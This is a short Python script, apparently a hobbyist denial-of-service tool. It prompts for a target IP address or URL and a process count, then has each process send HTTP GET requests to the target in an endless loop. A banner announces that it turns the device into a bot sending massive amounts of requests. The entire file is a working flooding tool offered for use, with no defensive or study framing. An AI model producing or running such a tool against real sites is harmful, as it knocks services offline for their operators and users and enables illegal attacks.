import requests
from multiprocessing import Process

def send_request(target_ip):
  while True:
    try:
      response = requests.get(f"http://{target_ip}")
      if response.status_code == 200:
        print("Requests successfully sent!")
      else:
        print("Mission unsuccessful.")
    except Exception as e:
      pass

if __name__ == "__main__":
  print("""
                                        WARNING:
  THIS SCRIPT TURNS YOUR DEVICE INTO A BOT THAT CONSTANTLY SENDS MASSIVE AMOUNTS OF REQUESTS TO THE TARGET IP/URL!
  1. When entering a URL, please remove the https:// or http:// from the beginning.
  2. If you decided to enter an IP address, there's a slight chance nothing will show.
  3. To stop sending requests, press Ctrl+C.
  """)

  target_ip = input("Enter the target IP address or URL: ")

  num_processes = int(input("Enter the number of processes to send(THE HIGHER THE NUMBER OF PROCESSES ARE THE GREATER WOULD BE THE REQUESTS): "))

  processes = []

  for _ in range(num_processes):
    p = Process(target=send_request, args=(target_ip,))
    p.start()
    processes.append(p)

  for p in processes:
    p.join()
